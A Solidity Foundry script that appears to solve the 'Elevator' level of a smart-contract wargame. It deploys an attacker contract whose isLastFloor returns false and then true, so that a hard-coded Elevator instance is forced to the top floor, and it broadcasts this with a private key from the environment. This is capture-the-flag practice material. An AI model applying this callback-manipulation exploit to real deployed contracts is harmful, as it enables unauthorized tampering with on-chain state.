//SPDX: License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Elevator.sol";
import "../lib/forge-std/src/Test.sol";
import "../lib/forge-std/src/Script.sol";
import "../lib/forge-std/src/console.sol";

contract MyBuilding {

   bool private helperSwitch;
   Elevator elevatorInstance = Elevator(0xa5D55831D3eDAccB84F8B4b3586D398Dcb9c31cd);
   
   function startAttack() external {
      elevatorInstance.goTo(7);
   }
   function isLastFloor(uint256 _floor) external returns (bool) {
      if(!helperSwitch){
         helperSwitch = true;
         return false;
      } else{
         return true;
      }
   }
}
contract ElevatorSolution is Script {

   function run() external {
    
    vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
    MyBuilding myBuilding = new MyBuilding();
    myBuilding.startAttack();
    vm.stopBroadcast();
   }
}